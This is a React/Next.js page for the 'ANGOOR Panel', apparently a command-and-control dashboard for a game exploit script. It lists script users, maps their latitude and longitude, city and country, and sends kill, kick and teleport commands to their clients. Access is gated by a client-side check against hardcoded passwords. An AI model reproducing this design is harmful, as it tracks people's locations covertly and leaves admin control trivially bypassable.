"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import dynamic from "next/dynamic";

const MapView = dynamic(() => import("@/app/MapView"), { ssr: false });

function formatDuration(ms) {
  if (!ms || ms < 0) return "0s";
  const s = Math.floor(ms / 1000);
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (h > 0) return `${h}h ${m}m`;
  if (m > 0) return `${m}m ${sec}s`;
  return `${sec}s`;
}

function timeAgo(iso) {
  if (!iso) return "—";
  const t = Date.parse(iso);
  if (!t) return "—";
  const d = Math.max(0, Date.now() - t);
  if (d < 15_000) return "just now";
  if (d < 60_000) return `${Math.floor(d / 1000)}s ago`;
  if (d < 3600_000) return `${Math.floor(d / 60000)}m ago`;
  return `${Math.floor(d / 3600000)}h ago`;
}

export default function PanelPage() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [err, setErr] = useState("");
  const [query, setQuery] = useState("");
  const [modal, setModal] = useState(null); // { type: 'tp'|'kill'|'kick', user }
  const [busy, setBusy] = useState(false);
  const [toast, setToast] = useState("");
  const [authed, setAuthed] = useState(false);
  const [pass, setPass] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined" && sessionStorage.getItem("angoor_panel") === "1") {
      setAuthed(true);
    }
  }, []);

  const showToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(""), 2200);
  };

  const load = useCallback(async () => {
    try {
      const r = await fetch("/api/presence", { cache: "no-store" });
      const j = await r.json();
      if (!r.ok) throw new Error(j.error || "fetch failed");
      setUsers(j.users || []);
      setErr("");
    } catch (e) {
      setErr(String(e.message || e));
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    if (!authed) return;
    load();
    const id = setInterval(load, 8000);
    return () => clearInterval(id);
  }, [authed, load]);

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    if (!q) return users;
    return users.filter(
      (u) =>
        String(u.username || "").toLowerCase().includes(q) ||
        String(u.display_name || "").toLowerCase().includes(q) ||
        String(u.user_id || "").includes(q) ||
        String(u.executor || u.device || "").toLowerCase().includes(q)
    );
  }, [users, query]);

  const online = filtered.filter((u) => u.online);
  const offline = filtered.filter((u) => !u.online);

  const sameServer = (user) =>
    users.filter(
      (u) =>
        u.online &&
        u.job_id &&
        user.job_id &&
        u.job_id === user.job_id &&
        String(u.user_id) !== String(user.user_id)
    );

  async function sendCommand(target_user_id, command, args = {}) {
    setBusy(true);
    try {
      const r = await fetch("/api/commands", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target_user_id, command, args }),
      });
      const j = await r.json();
      if (!r.ok) throw new Error(j.error || "command failed");
      showToast(`${command.toUpperCase()} sent`);
      setModal(null);
    } catch (e) {
      showToast(String(e.message || e));
    } finally {
      setBusy(false);
    }
  }

  function tryLogin(e) {
    e.preventDefault();
    // simple gate — change PANEL password client check (set env later if needed)
    if (pass === "Tesla" || pass === "angoor") {
      sessionStorage.setItem("angoor_panel", "1");
      setAuthed(true);
    } else {
      showToast("Wrong password");
    }
  }

  if (!authed) {
    return (
      <div className="shell">
        <BG />
        <div className="center">
          <form className="glass card login" onSubmit={tryLogin}>
            <div className="brand-row">
              <div className="mark">🍌</div>
              <div>
                <h1>ANGOOR Panel</h1>
                <p>Admin access</p>
              </div>
            </div>
            <input
              className="field"
              type="password"
              placeholder="Password"
              value={pass}
              onChange={(e) => setPass(e.target.value)}
              autoFocus
            />
            <button className="btn orbit" type="submit">
              Unlock
            </button>
          </form>
        </div>
        <Styles />
      </div>
    );
  }

  return (
    <div className="shell">
      <BG />
      <div className="wrap">
        <header className="glass top">
          <div className="brand-row">
            <div className="mark">🍌</div>
            <div>
              <h1>ANGOOR Panel</h1>
              <p>Live presence • liquid control</p>
            </div>
          </div>
          <div className="stats">
            <div className="pill">
              <span className="dot on" /> {online.length} online
            </div>
            <div className="pill">{users.length} total</div>
            <button className="btn orbit sm" onClick={load}>
              Refresh
            </button>
          </div>
        </header>

        <section className="grid">
          <div className="glass map-card">
            <div className="sec-title">Execution map</div>
            <div className="map-box">
              <MapView users={users.filter((u) => u.lat != null && u.lon != null)} />
            </div>
            <p className="hint">Points appear when the script sends location (lat/lon).</p>
          </div>

          <div className="glass list-card">
            <div className="list-head">
              <div className="sec-title">Users</div>
              <input
                className="field search"
                placeholder="Search name / id / executor"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
              />
            </div>
            {loading && <p className="hint">Loading…</p>}
            {err && <p className="err">{err}</p>}
            <div className="list">
              {[...online, ...offline].map((u) => (
                <UserRow
                  key={u.user_id}
                  u={u}
                  onTp={() => setModal({ type: "tp", user: u })}
                  onKill={() => sendCommand(u.user_id, "kill")}
                  onKick={() =>
                    sendCommand(u.user_id, "kick", { reason: "Kicked by admin" })
                  }
                />
              ))}
              {!loading && filtered.length === 0 && (
                <p className="hint">No users yet. Execute the script to appear here.</p>
              )}
            </div>
          </div>
        </section>
      </div>

      {modal?.type === "tp" && (
        <Modal onClose={() => setModal(null)}>
          <h2>Teleport {modal.user.display_name || modal.user.username}</h2>
          <p className="hint">
            Active players in the same server ({String(modal.user.job_id || "").slice(0, 8)}…)
          </p>
          <div className="tp-list">
            {sameServer(modal.user).length === 0 && (
              <p className="hint">No other active players in this server.</p>
            )}
            {sameServer(modal.user).map((t) => (
              <button
                key={t.user_id}
                className="tp-item orbit"
                disabled={busy}
                onClick={() =>
                  sendCommand(modal.user.user_id, "tp", {
                    to_user_id: t.user_id,
                    to_username: t.username,
                  })
                }
              >
                <img src={t.avatar} alt="" className="av" />
                <div className="meta">
                  <strong>{t.display_name || t.username}</strong>
                  <span>@{t.username}</span>
                </div>
                <span className="go">TP →</span>
              </button>
            ))}
          </div>
        </Modal>
      )}

      {toast && <div className="toast">{toast}</div>}
      <Styles />
    </div>
  );
}

function UserRow({ u, onTp, onKill, onKick }) {
  return (
    <div className={`urow ${u.online ? "on" : "off"}`}>
      <img className="av" src={u.avatar} alt="" />
      <div className="meta">
        <div className="name">
          <strong>{u.display_name || u.username}</strong>
          <span className={`badge ${u.online ? "on" : ""}`}>{u.online ? "ONLINE" : "OFF"}</span>
        </div>
        <div className="sub">
          @{u.username} · ID {u.user_id}
        </div>
        <div className="sub">
          Executor: <b>{u.executor || u.device || "Unknown"}</b>
          {u.city || u.country ? ` · ${[u.city, u.country].filter(Boolean).join(", ")}` : ""}
        </div>
        <div className="sub">
          Session: <b>{formatDuration(u.session_ms)}</b> · Last {timeAgo(u.last_seen)}
        </div>
      </div>
      <div className="actions">
        <button className="btn orbit sm" onClick={onTp} disabled={!u.online}>
          TP
        </button>
        <button className="btn orbit sm danger" onClick={onKill} disabled={!u.online}>
          Kill
        </button>
        <button className="btn orbit sm danger" onClick={onKick} disabled={!u.online}>
          Kick
        </button>
      </div>
    </div>
  );
}

function Modal({ children, onClose }) {
  return (
    <div className="modal-root" onClick={onClose}>
      <div className="modal glass" onClick={(e) => e.stopPropagation()}>
        <button className="x" onClick={onClose}>
          ✕
        </button>
        {children}
      </div>
    </div>
  );
}

function BG() {
  return (
    <div className="bg" aria-hidden>
      <div className="blob b1" />
      <div className="blob b2" />
      <div className="blob b3" />
      <div className="shine" />
    </div>
  );
}

function Styles() {
  return (
    <style jsx global>{`
      :root {
        --text: #f7fbff;
        --muted: rgba(240, 248, 255, 0.7);
        --accent: #9fd7ff;
        --danger: #ff6b81;
      }
      * { box-sizing: border-box; }
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
        color: var(--text);
        background: #06101c;
      }
      .shell { min-height: 100vh; position: relative; }
      .bg {
        position: fixed; inset: 0; z-index: 0; overflow: hidden;
        background:
          radial-gradient(1000px 600px at 15% 20%, rgba(120,190,255,.4), transparent 60%),
          radial-gradient(900px 500px at 85% 15%, rgba(170,140,255,.3), transparent 55%),
          linear-gradient(160deg, #0a1a2e, #10253d 45%, #0b1830);
      }
      .blob {
        position: absolute; border-radius: 50%; filter: blur(40px); opacity: .7;
        mix-blend-mode: screen; animation: drift 18s ease-in-out infinite alternate;
      }
      .b1 { width: 40vw; height: 40vw; left: -8%; top: -10%; background: radial-gradient(circle, #9fd7ff, transparent 70%); }
      .b2 { width: 32vw; height: 32vw; right: -6%; top: 10%; background: radial-gradient(circle, #c5b6ff, transparent 70%); animation-delay: -4s; }
      .b3 { width: 44vw; height: 44vw; left: 25%; bottom: -20%; background: radial-gradient(circle, #7fd0ff, transparent 70%); animation-delay: -8s; }
      .shine {
        position: absolute; inset: -20%; pointer-events: none;
        background: radial-gradient(circle at 30% 20%, rgba(255,255,255,.18), transparent 40%);
        animation: glow 12s ease-in-out infinite alternate;
      }
      @keyframes drift {
        0% { transform: translate3d(0,0,0) scale(1); }
        100% { transform: translate3d(-2%, 3%, 0) scale(1.05); }
      }
      @keyframes glow { from { opacity: .7; } to { opacity: 1; } }
      @keyframes orbit {
        to { --a: 360deg; }
      }
      @keyframes pop {
        from { opacity: 0; transform: translateY(16px) scale(.96); }
        to { opacity: 1; transform: translateY(0) scale(1); }
      }

      .wrap { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 24px 16px 48px; }
      .center { position: relative; z-index: 1; min-height: 100vh; display: grid; place-items: center; padding: 24px; }
      .glass {
        background: linear-gradient(180deg, rgba(255,255,255,.14), rgba(255,255,255,.06));
        border: 1px solid rgba(255,255,255,.22);
        border-radius: 24px;
        backdrop-filter: blur(24px) saturate(150%);
        -webkit-backdrop-filter: blur(24px) saturate(150%);
        box-shadow: 0 20px 60px rgba(0,0,0,.25), inset 0 1px 0 rgba(255,255,255,.25);
      }
      .top {
        display: flex; flex-wrap: wrap; gap: 16px; align-items: center; justify-content: space-between;
        padding: 18px 20px; margin-bottom: 16px;
      }
      .brand-row { display: flex; gap: 12px; align-items: center; }
      .mark {
        width: 44px; height: 44px; border-radius: 14px; display: grid; place-items: center; font-size: 22px;
        background: linear-gradient(145deg, rgba(255,255,255,.28), rgba(255,255,255,.08));
        border: 1px solid rgba(255,255,255,.3);
      }
      h1 { margin: 0; font-size: 1.2rem; }
      .brand-row p, .hint { margin: 2px 0 0; color: var(--muted); font-size: .86rem; }
      .stats { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
      .pill {
        padding: 8px 12px; border-radius: 999px; background: rgba(255,255,255,.08);
        border: 1px solid rgba(255,255,255,.14); font-size: .85rem;
      }
      .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; background: #666; }
      .dot.on { background: #5dffb0; box-shadow: 0 0 10px #5dffb0; }

      .grid { display: grid; grid-template-columns: 1.05fr 1.2fr; gap: 16px; }
      @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
      .map-card, .list-card { padding: 16px; min-height: 420px; }
      .sec-title { font-weight: 700; margin-bottom: 10px; letter-spacing: .02em; }
      .map-box { height: 360px; border-radius: 18px; overflow: hidden; border: 1px solid rgba(255,255,255,.12); }
      .list-head { display: flex; gap: 12px; align-items: center; justify-content: space-between; margin-bottom: 10px; flex-wrap: wrap; }
      .list { display: flex; flex-direction: column; gap: 10px; max-height: 520px; overflow: auto; padding-right: 4px; }
      .urow {
        display: grid; grid-template-columns: 52px 1fr auto; gap: 12px; align-items: center;
        padding: 12px; border-radius: 16px; background: rgba(255,255,255,.06);
        border: 1px solid rgba(255,255,255,.1);
      }
      .urow.off { opacity: .72; }
      .av { width: 48px; height: 48px; border-radius: 14px; object-fit: cover; background: #111; border: 1px solid rgba(255,255,255,.2); }
      .name { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
      .badge { font-size: .68rem; padding: 3px 8px; border-radius: 999px; background: rgba(255,255,255,.1); color: var(--muted); }
      .badge.on { background: rgba(93,255,176,.15); color: #9dffc9; }
      .sub { color: var(--muted); font-size: .8rem; margin-top: 2px; }
      .sub b { color: #e8f6ff; font-weight: 600; }
      .actions { display: flex; flex-direction: column; gap: 6px; }

      .field {
        width: 100%; border: 1px solid rgba(255,255,255,.16); background: rgba(0,0,0,.25);
        color: #fff; border-radius: 14px; padding: 12px 14px; outline: none;
      }
      .search { max-width: 260px; padding: 10px 12px; }
      .login { width: min(360px, 100%); padding: 22px; display: flex; flex-direction: column; gap: 12px; }

      .btn {
        position: relative; border: 0; cursor: pointer; border-radius: 999px;
        padding: 10px 14px; font-weight: 650; color: #071018;
        background: linear-gradient(180deg, #fff, #d7ecff);
        overflow: hidden;
      }
      .btn.sm { padding: 7px 10px; font-size: .78rem; }
      .btn.danger { color: #fff; background: linear-gradient(180deg, #ff8a9a, #e2556d); }
      .btn:disabled { opacity: .45; cursor: not-allowed; }
      .btn.orbit::before {
        content: ""; position: absolute; inset: -2px; border-radius: inherit; padding: 2px;
        background: conic-gradient(from var(--a, 0deg), transparent 0%, #fff 12%, transparent 28%, transparent 100%);
        -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
        mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
        -webkit-mask-composite: xor; mask-composite: exclude;
        animation: orbit 2.4s linear infinite;
        pointer-events: none;
      }

      .modal-root {
        position: fixed; inset: 0; z-index: 50; display: grid; place-items: center;
        background: rgba(4, 10, 20, .55); backdrop-filter: blur(10px);
        padding: 16px;
      }
      .modal {
        width: min(440px, 100%); padding: 20px; position: relative;
        animation: pop .28s cubic-bezier(.2,.9,.2,1);
      }
      .modal h2 { margin: 0 0 6px; font-size: 1.15rem; }
      .x {
        position: absolute; right: 12px; top: 12px; border: 0; background: rgba(255,255,255,.1);
        color: #fff; width: 32px; height: 32px; border-radius: 999px; cursor: pointer;
      }
      .tp-list { display: flex; flex-direction: column; gap: 8px; margin-top: 12px; max-height: 360px; overflow: auto; }
      .tp-item {
        display: grid; grid-template-columns: 42px 1fr auto; gap: 10px; align-items: center;
        text-align: left; padding: 10px; border-radius: 14px; border: 1px solid rgba(255,255,255,.14);
        background: rgba(255,255,255,.07); color: #fff; cursor: pointer; position: relative; overflow: hidden;
      }
      .tp-item .meta { display: flex; flex-direction: column; }
      .tp-item span { color: var(--muted); font-size: .8rem; }
      .go { font-weight: 700; color: var(--accent); }
      .toast {
        position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); z-index: 60;
        background: rgba(10,16,28,.9); border: 1px solid rgba(255,255,255,.2);
        padding: 12px 16px; border-radius: 999px; backdrop-filter: blur(12px);
      }
      .err { color: #ff8a9a; }
    `}</style>
  );
}
